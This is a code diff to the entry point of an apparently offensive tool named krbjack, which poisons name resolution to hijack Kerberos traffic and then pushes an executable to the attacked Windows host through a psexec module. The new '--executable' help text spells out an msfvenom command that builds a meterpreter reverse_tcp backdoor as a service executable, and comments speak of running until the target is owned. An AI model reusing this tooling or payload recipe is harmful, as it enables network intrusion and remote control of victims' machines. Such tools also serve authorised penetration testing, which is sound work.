@@ -1,8 +1,8 @@
 from colorama import deinit as colorama_deinit
 from colorama import init as colorama_init
 from ipaddress import IPv4Address
-import importlib
 import argparse
+import pathlib
 
 from .krbjacker import KrbJacker
 
@@ -70,29 +70,39 @@ def main():
         help="List of TCP ports to forward from the incoming clients to the attacked system."
              " Comma-separated port numbers. Example : 139,445,8080."
     )
-    cmdparser = parser.add_subparsers(description="Supported modules", required=True, dest="module")
+    parser.add_argument(
+        "--executable", type=pathlib.Path, required=True,
+        help=(
+            "The executable to push and execute to the remote target. "
+            "Can be generated with msfvenom type exe-service. "
+            "Example : msfvenom -p windows/x64/meterpreter/reverse_tcp "
+            "-f exe-service -o backdoor.exe LHOST=X LPORT=Y. If the executable"
+            " is not a service executable, it will still work, though the process"
+            " will be killed after a few seconds by windows if it takes too long to"
+            " run."
+        )
+    )
     # Feeling to lazy to implement automatic module detection, they must be listed here
     # for the time being.
     modules = ["psexec"]
-    for module in modules:
-        m = importlib.import_module(f"krbjack.modules.{module}").Module
-        m.add_options(cmdparser)
 
     args = parser.parse_args()
     colorama_init()
-    jacker = KrbJacker(args)
+    jacker = KrbJacker(args, modules)
     try:
         jacker.run()  # Stops when target owned
-        if jacker.chosen_module.requires_cleaning:
-            jacker.chosen_module.cleanup()
+        for m in jacker.running_modules:
+            if m.requires_cleaning:
+                m.cleanup()
     except KeyboardInterrupt:
         print("Asking children threads to stop ...")
         print("Please wait if you don't want to DoS your target 🙏")
         jacker.stop_forwarding()
         if jacker.is_poisoning_active:
             jacker.unpoison()
-        if jacker.chosen_module.requires_cleaning:
-            jacker.chosen_module.cleanup()
+        for m in jacker.running_modules:
+            if m.requires_cleaning:
+                m.cleanup()
     colorama_deinit()
     print("Bye.")
 
